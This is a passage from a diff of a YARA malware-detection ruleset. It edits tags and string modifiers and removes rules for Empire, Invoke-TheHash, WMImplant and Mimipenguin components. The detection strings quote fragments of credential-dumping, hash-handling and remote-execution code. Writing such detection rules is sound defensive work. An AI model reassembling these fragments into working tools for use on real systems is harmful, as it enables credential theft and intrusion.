-      description = "Detects obfuscated wscript.shell commands"
-      author = "Florian Roth"
-      reference = "Internal Research"
-      date = "2017-09-11 12:58:31"
-      score = 60
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      modified = "2022-06-09"
-      tags = "ANOMALY, DEMO, OBFUS, SCRIPT, SUSP, T1059"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "WScript.Shell\").Run" nocase ascii wide
-      $sn1 = "WScript.Shell\").Run" ascii wide
-      $sn2 = "wscript.shell\").run" ascii wide
-      $sn3 = "WSCRIPT.SHELL\").RUN" ascii wide
-      $sn4 = "Wscript.Shell\").Run" ascii wide
-      $sn5 = "WScript.shell\").Run" ascii wide
-   condition: 
-      filesize < 3000KB and #s1 > #sn1 + #sn2 + #sn3 + #sn4 + #sn5
 }
 
 rule MAL_KHRAT_script_RID2CB8 : DEMO MAL SCRIPT T1053_005 T1218_011 {
@@ -8739,7 +9498,7 @@ rule APT12_Malware_Aug17_RID2D65 : DEMO EXE FILE G0005 MAL {
       ( uint16 ( 0 ) == 0x5a4d and pe.imphash ( ) == "9ba915fd04f248ad62e856c7238c0264" )
 }
 
-rule JavaScript_Run_Suspicious_RID3132 : DEMO SCRIPT T1059 {
+rule JavaScript_Run_Suspicious_RID3132 : DEMO SCRIPT {
    meta:
       description = "Detects a suspicious Javascript Run command"
       author = "Florian Roth"
@@ -8749,17 +9508,17 @@ rule JavaScript_Run_Suspicious_RID3132 : DEMO SCRIPT T1059 {
       customer = "demo"
       license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
       
-      tags = "DEMO, SCRIPT, T1059"
+      tags = "DEMO, SCRIPT"
       minimum_yara = "3.5.0"
       
    strings:
       $s1 = "w = new ActiveXObject(" ascii
-      $s2 = " w.Run(r);" fullword ascii
+      $s2 = " w.Run(r);" ascii fullword
    condition: 
       all of them
 }
 
-rule Suspicious_Script_Running_from_HTTP_RID350E : DEMO SCRIPT T1059 {
+rule Suspicious_Script_Running_from_HTTP_RID350E : DEMO SCRIPT {
    meta:
       description = "Detects a suspicious "
       author = "Florian Roth"
@@ -8769,7 +9528,7 @@ rule Suspicious_Script_Running_from_HTTP_RID350E : DEMO SCRIPT T1059 {
       customer = "demo"
       license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
       
-      tags = "DEMO, SCRIPT, T1059"
+      tags = "DEMO, SCRIPT"
       minimum_yara = "3.5.0"
       
    strings:
@@ -8865,7 +9624,7 @@ rule Exp_EPS_CVE20152545_RID2C5A : DEMO EXPLOIT FILE OFFICE {
       uint16 ( 0 ) == 0x4b50 and ( $s1 and #s2 > 20 )
 }
 
-rule JS_Suspicious_Obfuscation_Dropbox_RID345D : DEMO OBFUS SCRIPT T1059 T1059_001 T1059_007 {
+rule JS_Suspicious_Obfuscation_Dropbox_RID345D : DEMO OBFUS SCRIPT T1059_001 T1059_007 {
    meta:
       description = "Detects PowerShell AMSI Bypass"
       author = "Florian Roth"
@@ -8875,7 +9634,7 @@ rule JS_Suspicious_Obfuscation_Dropbox_RID345D : DEMO OBFUS SCRIPT T1059 T1059_0
       customer = "demo"
       license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
       
-      tags = "DEMO, OBFUS, SCRIPT, T1059, T1059_001, T1059_007"
+      tags = "DEMO, OBFUS, SCRIPT, T1059_001, T1059_007"
       minimum_yara = "3.5.0"
       
    strings:
@@ -8885,7 +9644,7 @@ rule JS_Suspicious_Obfuscation_Dropbox_RID345D : DEMO OBFUS SCRIPT T1059 T1059_0
       2 of them
 }
 
-rule JS_Suspicious_MSHTA_Bypass_RID30F1 : DEMO SCRIPT T1059 T1059_007 T1218_005 {
+rule JS_Suspicious_MSHTA_Bypass_RID30F1 : DEMO SCRIPT T1059_007 T1218_005 {
    meta:
       description = "Detects MSHTA Bypass"
       author = "Florian Roth"
@@ -8895,7 +9654,7 @@ rule JS_Suspicious_MSHTA_Bypass_RID30F1 : DEMO SCRIPT T1059 T1059_007 T1218_005 
       customer = "demo"
       license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
       
-      tags = "DEMO, SCRIPT, T1059, T1059_007, T1218_005"
+      tags = "DEMO, SCRIPT, T1059_007, T1218_005"
       minimum_yara = "3.5.0"
       
    strings:
@@ -9000,7 +9759,7 @@ rule Wordpress_Config_Webshell_Preprend_RID34C3 : DEMO FILE T1505_003 WEBSHELL {
       uint32 ( 0 ) == 0x68703f3c and filesize < 400KB and $x1 and all of ( $s* ) and not $x1 in ( 0 .. 1000 ) and not 1 of ( $fp* )
 }
 
-rule PowerShell_ISESteroids_Obfuscation_RID347F : DEMO OBFUS SCRIPT T1059 T1059_001 {
+rule PowerShell_ISESteroids_Obfuscation_RID347F : DEMO OBFUS SCRIPT T1059_001 {
    meta:
       description = "Detects PowerShell ISESteroids obfuscation"
       author = "Florian Roth"
@@ -9010,13 +9769,13 @@ rule PowerShell_ISESteroids_Obfuscation_RID347F : DEMO OBFUS SCRIPT T1059 T1059_
       customer = "demo"
       license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
       
-      tags = "DEMO, OBFUS, SCRIPT, T1059, T1059_001"
+      tags = "DEMO, OBFUS, SCRIPT, T1059_001"
       minimum_yara = "3.5.0"
       
    strings:
       $x1 = "/\\/===\\__" ascii
       $x2 = "${__/\\/==" ascii
-      $x3 = "Catch { }" fullword ascii
+      $x3 = "Catch { }" ascii fullword
       $x4 = "\\_/=} ${_" ascii
    condition: 
       2 of them
@@ -9061,30 +9820,7 @@ rule HTA_with_WScript_Shell_RID2F8B : DEMO SCRIPT SUSP {
       all of them
 }
 
-rule Invoke_SMBExec_RID2C43 : DEMO SCRIPT T1059 {
-   meta:
-      description = "Detects Invoke-WmiExec or Invoke-SmbExec"
-      author = "Florian Roth"
-      reference = "https://github.com/Kevin-Robertson/Invoke-TheHash"
-      date = "2017-06-14 09:41:41"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "674fc045dc198874f323ebdfb9e9ff2f591076fa6fac8d1048b5b8d9527c64cd"
-      tags = "DEMO, SCRIPT, T1059"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $x1 = "Invoke-SMBExec -Target" fullword ascii
-      $x2 = "$packet_SMB_header = Get-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID_bytes $SMB_user_ID" fullword ascii
-      $s1 = "Write-Output \"Command executed with service $SMB_service on $Target\"" fullword ascii
-      $s2 = "$packet_RPC_data = Get-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00" fullword ascii
-      $s3 = "$SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \\svcctl" fullword ascii
-   condition: 
-      ( filesize < 400KB and 1 of them )
-}
-
-rule Invoke_WMIExec_Gen_1_RID2E57 : DEMO GEN SCRIPT T1059 {
+rule Invoke_WMIExec_Gen_1_RID2E57 : DEMO GEN SCRIPT {
    meta:
       description = "Detects Invoke-WmiExec or Invoke-SmbExec"
       author = "Florian Roth"
@@ -9095,21 +9831,21 @@ rule Invoke_WMIExec_Gen_1_RID2E57 : DEMO GEN SCRIPT T1059 {
       license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
       hash1 = "140c23514dbf8043b4f293c501c2f9046efcc1c08630621f651cfedb6eed8b97"
       hash2 = "7565d376665e3cd07d859a5cf37c2332a14c08eb808cc5d187a7f0533dc69e07"
-      tags = "DEMO, GEN, SCRIPT, T1059"
+      tags = "DEMO, GEN, SCRIPT"
       minimum_yara = "3.5.0"
       
    strings:
       $x1 = "Invoke-WMIExec " ascii
-      $x2 = "$target_count = [System.math]::Pow(2,(($target_address.GetAddressBytes().Length * 8) - $subnet_mask_split))" fullword ascii
-      $s1 = "Import-Module $PWD\\Invoke-TheHash.ps1" fullword ascii
-      $s2 = "Import-Module $PWD\\Invoke-SMBClient.ps1" fullword ascii
-      $s3 = "$target_address_list = [System.Net.Dns]::GetHostEntry($target_long).AddressList" fullword ascii
+      $x2 = "$target_count = [System.math]::Pow(2,(($target_address.GetAddressBytes().Length * 8) - $subnet_mask_split))" ascii fullword
+      $s1 = "Import-Module $PWD\\Invoke-TheHash.ps1" ascii fullword
+      $s2 = "Import-Module $PWD\\Invoke-SMBClient.ps1" ascii fullword
+      $s3 = "$target_address_list = [System.Net.Dns]::GetHostEntry($target_long).AddressList" ascii fullword
       $x4 = "Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0" ascii
    condition: 
       1 of them
 }
 
-rule Invoke_SMBExec_Invoke_WMIExec_1_RID326F : DEMO SCRIPT T1059 T1059_001 {
+rule Invoke_SMBExec_Invoke_WMIExec_1_RID326F : DEMO SCRIPT T1059_001 {
    meta:
       description = "Semiautomatically generated YARA rule - from files Invoke-SMBExec.ps1, Invoke-WMIExec.ps1"
       author = "Florian Roth"
@@ -9120,18 +9856,18 @@ rule Invoke_SMBExec_Invoke_WMIExec_1_RID326F : DEMO SCRIPT T1059 T1059_001 {
       license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
       hash1 = "674fc045dc198874f323ebdfb9e9ff2f591076fa6fac8d1048b5b8d9527c64cd"
       hash2 = "b41bd54bbf119d153e0878696cd5a944cbd4316c781dd8e390507b2ec2d949e7"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
+      tags = "DEMO, SCRIPT, T1059_001"
       minimum_yara = "3.5.0"
       
    strings:
-      $s1 = "$process_ID = $process_ID -replace \"-00-00\",\"\"" fullword ascii
-      $s2 = "Write-Output \"$Target did not respond\"" fullword ascii
-      $s3 = "[Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)" fullword ascii
+      $s1 = "$process_ID = $process_ID -replace \"-00-00\",\"\"" ascii fullword
+      $s2 = "Write-Output \"$Target did not respond\"" ascii fullword
+      $s3 = "[Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)" ascii fullword
    condition: 
       all of them
 }
 
-rule Invoke_WMIExec_Gen_RID2DC7 : DEMO GEN SCRIPT T1059 T1059_001 {
+rule Invoke_WMIExec_Gen_RID2DC7 : DEMO GEN SCRIPT T1059_001 {
    meta:
       description = "Semiautomatically generated YARA rule - from files Invoke-SMBClient.ps1, Invoke-SMBExec.ps1, Invoke-WMIExec.ps1, Invoke-WMIExec.ps1"
       author = "Florian Roth"
@@ -9143,13 +9879,13 @@ rule Invoke_WMIExec_Gen_RID2DC7 : DEMO GEN SCRIPT T1059 T1059_001 {
       hash1 = "56c6012c36aa863663fe5536d8b7fe4c460565d456ce2277a883f10d78893c01"
       hash2 = "674fc045dc198874f323ebdfb9e9ff2f591076fa6fac8d1048b5b8d9527c64cd"
       hash3 = "b41bd54bbf119d153e0878696cd5a944cbd4316c781dd8e390507b2ec2d949e7"
-      tags = "DEMO, GEN, SCRIPT, T1059, T1059_001"
+      tags = "DEMO, GEN, SCRIPT, T1059_001"
       minimum_yara = "3.5.0"
       
    strings:
-      $s1 = "$NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)" fullword ascii
-      $s2 = "$client_challenge = [String](1..8 | ForEach-Object {\"{0:X2}\" -f (Get-Random -Minimum 1 -Maximum 255)})" fullword ascii
-      $s3 = "$NTLM_hash_bytes = $NTLM_hash_bytes.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}" fullword ascii
+      $s1 = "$NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)" ascii fullword
+      $s2 = "$client_challenge = [String](1..8 | ForEach-Object {\"{0:X2}\" -f (Get-Random -Minimum 1 -Maximum 255)})" ascii fullword
+      $s3 = "$NTLM_hash_bytes = $NTLM_hash_bytes.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}" ascii fullword
    condition: 
       all of them
 }
@@ -9283,29 +10019,28 @@ rule OpCloudHopper_WmiDLL_inMemory_RID324C : APT DEMO {
       all of them
 }
 
-rule Invoke_OSiRis_RID2C15 : DEMO SCRIPT T1059 T1059_001 {
+rule Mimipenguin_SH_RID2C8D : DEMO HKTL LINUX SCRIPT T1003 {
    meta:
-      description = "Osiris Device Guard Bypass - file Invoke-OSiRis.ps1"
+      description = "Detects Mimipenguin Password Extractor - Linux"
       author = "Florian Roth"
-      reference = "Internal Research"
-      date = "2017-03-27 09:34:01"
-      score = 70
+      reference = "https://github.com/huntergregal/mimipenguin"
+      date = "2017-04-01 09:54:01"
+      score = 75
       customer = "demo"
       license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      modified = "2025-03-21"
-      hash1 = "19e4a8b07f85c3d4c396d0c4e839495c9fba9405c06a631d57af588032d2416e"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
+      
+      tags = "DEMO, HKTL, LINUX, SCRIPT, T1003"
       minimum_yara = "3.5.0"
       
    strings:
-      $x1 = "$null = Iwmi Win32_Process -EnableA -Impers 3 -AuthenPacketprivacy -Name Create -Arg $ObfusK -Computer $Target" ascii wide
-      $x3 = "-Arg@{Name=$VarName;VariableValue=$OSiRis;UserName=$env:Username}" ascii wide
-      $x4 = "Device Guard Bypass Command Execution" ascii wide
+      $s1 = "$(echo $thishash | cut -d'$' -f 3)" ascii
+      $s2 = "ps -eo pid,command | sed -rn '/gnome\\-keyring\\-daemon/p' | awk" ascii
+      $s3 = "MimiPenguin Results:" ascii
    condition: 
-      filesize < 8MB and 1 of them
+      1 of them
 }
 
-rule WMImplant_RID2A8A : DEMO SCRIPT T1047 T1059 T1059_001 {
+rule WMImplant_RID2A8A : DEMO SCRIPT T1047 T1059_001 {
    meta:
       description = "Detects WMI implant- file WMImplant_RID2A8A.ps1"
       author = "Florian Roth"
@@ -9315,16 +10050,16 @@ rule WMImplant_RID2A8A : DEMO SCRIPT T1047 T1059 T1059_001 {
       customer = "demo"
       license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
       hash1 = "860d7c237c2395b4f51b8c9bd0ee6cab06af38fff60ce3563d160d50c11d2f78"
-      tags = "DEMO, SCRIPT, T1047, T1059, T1059_001"
+      tags = "DEMO, SCRIPT, T1047, T1059_001"
       minimum_yara = "3.5.0"
       
    strings:
-      $x1 = "Invoke-ProcessPunisher -Creds $RemoteCredential" fullword ascii
+      $x1 = "Invoke-ProcessPunisher -Creds $RemoteCredential" ascii fullword
       $x2 = "$Target -query \"SELECT * FROM Win32_NTLogEvent WHERE (logfile='security')" ascii
-      $x3 = "WMImplant_RID2A8A -Creds" fullword ascii
+      $x3 = "WMImplant_RID2A8A -Creds" ascii fullword
       $x4 = "-Download -RemoteFile C:\\passwords.txt" ascii
-      $x5 = "-Command 'powershell.exe -command \"Enable-PSRemoting" fullword ascii
-      $x6 = "Invoke-WMImplant_RID2A8A" fullword ascii
+      $x5 = "-Command 'powershell.exe -command \"Enable-PSRemoting" ascii fullword
+      $x6 = "Invoke-WMImplant_RID2A8A" ascii fullword
    condition: 
       1 of them
 }
@@ -9858,577 +10593,6 @@ rule p0wnedShell_outputs_RID2EDA : DEMO HKTL {
       1 of them
 }
 
-rule Empire_Invoke_MetasploitPayload_RID3389 : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Invoke-MetasploitPayload.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 14:52:01"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "a85ca27537ebeb79601b885b35ddff6431860b5852c6a664d32a321782808c54"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$ProcessInfo.Arguments=\"-nop -c $DownloadCradle\"" fullword ascii
-      $s2 = "$PowershellExe=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 9KB and 1 of them ) or all of them
-}
-
-rule Empire_Exploit_Jenkins_RID2FE8 : DEMO EXPLOIT SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Exploit-Jenkins.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 12:17:11"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "a5182cccd82bb9984b804b365e07baba78344108f225b94bd12a59081f680729"
-      tags = "DEMO, EXPLOIT, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$postdata=\"script=println+new+ProcessBuilder%28%27\"+$($Cmd)+\"" ascii
-      $s2 = "$url = \"http://\"+$($Rhost)+\":\"+$($Port)+\"/script\"" fullword ascii
-      $s3 = "$Cmd = [System.Web.HttpUtility]::UrlEncode($Cmd)" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x6620 and filesize < 7KB and 1 of them ) or all of them
-}
-
-rule Empire_Get_SecurityPackages_RID31C8 : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Get-SecurityPackages.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 13:37:11"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "5d06e99121cff9b0fce74b71a137501452eebbcd1e901b26bde858313ee5a9c1"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$null = $EnumBuilder.DefineLiteral('LOGON', 0x2000)" fullword ascii
-      $s2 = "$EnumBuilder = $ModuleBuilder.DefineEnum('SSPI.SECPKG_FLAG', 'Public', [Int32])" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 20KB and 1 of them ) or all of them
-}
-
-rule Empire_Invoke_PowerDump_RID3040 : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Invoke-PowerDump.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 12:31:51"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "095c5cf5c0c8a9f9b1083302e2ba1d4e112a410e186670f9b089081113f5e0e1"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $x16 = "$enc = Get-PostHashdumpScript" fullword ascii
-      $x19 = "$lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;" fullword ascii
-      $x20 = "$rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x2023 and filesize < 60KB and 1 of them ) or all of them
-}
-
-rule Empire_Install_SSP_RID2DFE : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Install-SSP.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 10:55:31"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "7fd921a23950334257dda57b99e03c1e1594d736aab2dbfe9583f99cd9b1d165"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "Install-SSP -Path .\\mimilib.dll" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 20KB and 1 of them ) or all of them
-}
-
-rule Empire_Invoke_ShellcodeMSIL_RID3165 : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Invoke-ShellcodeMSIL.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 13:20:41"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "9a9c6c9eb67bde4a8ce2c0858e353e19627b17ee2a7215fa04a19010d3ef153f"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$FinalShellcode.Length" fullword ascii
-      $s2 = "@(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)" fullword ascii
-      $s3 = "@(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57," fullword ascii
-      $s4 = "$TargetMethod.Invoke($null, @(0x11112222)) | Out-Null" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
-}
-
-rule HKTL_Empire_PowerUp_RID2E36 : DEMO HKTL SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file PowerUp.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 11:04:51"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "ad9a5dff257828ba5f15331d59dd4def3989537b3b6375495d0c08394460268c"
-      tags = "DEMO, HKTL, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $x2 = "$PoolPasswordCmd = 'c:\\windows\\system32\\inetsrv\\appcmd.exe list apppool" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x233c and filesize < 2000KB and 1 of them ) or all of them
-}
-
-rule Empire_Get_GPPPassword_RID2F8B : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Get-GPPPassword.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 12:01:41"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "55a4519c4f243148a971e4860225532a7ce730b3045bde3928303983ebcc38b0"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$Base64Decoded = [Convert]::FromBase64String($Cpassword)" fullword ascii
-      $s2 = "$XMlFiles += Get-ChildItem -Path \"\\\\$DomainController\\SYSVOL\" -Recurse" ascii
-      $s3 = "function Get-DecryptedCpassword {" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
-}
-
-rule Empire_Invoke_SmbScanner_RID3089 : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Invoke-SmbScanner.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 12:44:01"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "9a705f30766279d1e91273cfb1ce7156699177a109908e9a986cc2d38a7ab1dd"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$up = Test-Connection -count 1 -Quiet -ComputerName $Computer " fullword ascii
-      $s2 = "$out | add-member Noteproperty 'Password' $Password" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 10KB and 1 of them ) or all of them
-}
-
-rule Empire_Exploit_JBoss_RID2EF7 : DEMO EXPLOIT SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Exploit-JBoss.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 11:37:01"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "9ea3e00b299e644551d90bbee0ce3e4e82445aa15dab7adb7fcc0b7f1fe4e653"
-      tags = "DEMO, EXPLOIT, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "Exploit-JBoss" fullword ascii
-      $s2 = "$URL = \"http$($SSL)://\" + $($Rhost) + ':' + $($Port)" ascii
-      $s3 = "\"/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service" ascii
-      $s4 = "http://blog.rvrsh3ll.net" fullword ascii
-      $s5 = "Remote URL to your own WARFile to deploy." fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 10KB and 1 of them ) or all of them
-}
-
-rule Empire_dumpCredStore_RID2F13 : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file dumpCredStore.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 11:41:41"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "c1e91a5f9cc23f3626326dab2dcdf4904e6f8a332e2bce8b9a0854b371c2b350"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $x1 = "[DllImport(\"Advapi32.dll\", SetLastError = true, EntryPoint = \"CredReadW\"" ascii
-      $s12 = "[String] $Msg = \"Failed to enumerate credentials store for user '$Env:UserName'\"" fullword ascii
-      $s15 = "Rtn = CredRead(\"Target\", CRED_TYPE.GENERIC, out Cred);" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x233c and filesize < 40KB and 1 of them ) or all of them
-}
-
-rule Empire_Invoke_EgressCheck_RID30E4 : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Invoke-EgressCheck.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 12:59:11"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "e2d270266abe03cfdac66e6fc0598c715e48d6d335adf09a9ed2626445636534"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "egress -ip $ip -port $c -delay $delay -protocol $protocol" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x233c and filesize < 10KB and 1 of them ) or all of them
-}
-
-rule Empire_ReflectivePick_x64_orig_RID32B3 : DEMO EXE FILE SCRIPT T1059 {
-   meta:
-      description = "Detects Empire component - file ReflectivePick_x64_orig.dll"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 14:16:21"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      modified = "2022-12-21"
-      hash1 = "a8c1b108a67e7fc09f81bd160c3bafb526caf3dbbaf008efb9a96f4151756ff2"
-      tags = "DEMO, EXE, FILE, SCRIPT, T1059"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $a1 = "\\PowerShellRunner.pdb" ascii
-      $a2 = "PowerShellRunner.dll" fullword wide
-      $s1 = "ReflectivePick" fullword ascii
-   condition: 
-      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of ( $a* ) and $s1
-}
-
-rule Empire_Out_Minidump_RID2EAC : DEMO SCRIPT T1003_001 T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Out-Minidump.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 11:24:31"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "7803ae7ba5d4e7d38e73745b3f321c2ca714f3141699d984322fa92e0ff037a1"
-      tags = "DEMO, SCRIPT, T1003_001, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle," fullword ascii
-      $s2 = "$ProcessFileName = \"$($ProcessName)_$($ProcessId).dmp\"" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 10KB and 1 of them ) or all of them
-}
-
-rule Empire_Invoke_PsExec_RID2EE5 : DEMO SCRIPT T1059 T1059_001 T1569_002 {
-   meta:
-      description = "Detects Empire component - file Invoke-PsExec.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 11:34:01"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "0218be4323959fc6379489a6a5e030bb9f1de672326e5e5b8844ab5cedfdcf88"
-      tags = "DEMO, SCRIPT, T1059, T1059_001, T1569_002"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "Invoke-PsExecCmd" fullword ascii
-      $s2 = "\"[*] Executing service .EXE" fullword ascii
-      $s3 = "$cmd = \"%COMSPEC% /C echo $Command ^> %systemroot%\\Temp\\" ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 50KB and 1 of them ) or all of them
-}
-
-rule Empire_Invoke_PostExfil_RID303B : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Invoke-PostExfil.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
